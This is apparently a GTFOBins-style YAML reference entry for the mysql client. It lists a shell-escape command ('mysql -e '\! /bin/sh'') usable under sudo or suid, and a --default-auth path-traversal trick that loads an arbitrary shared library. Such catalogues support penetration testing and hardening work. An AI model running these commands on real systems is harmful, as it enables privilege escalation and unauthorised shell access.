---
comment: |-
  A valid MySQL server must be available to connect to.
functions:
  library-load:
  - code: |-
      mysql --default-auth ../../../../../path/to/lib
    comment: |-
      The following loads the `/path/to/lib.so` shared object.
    contexts:
      sudo:
      suid:
      unprivileged:
    version: |-
      5.5
  shell:
  - code: |-
      mysql -e '\! /bin/sh'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
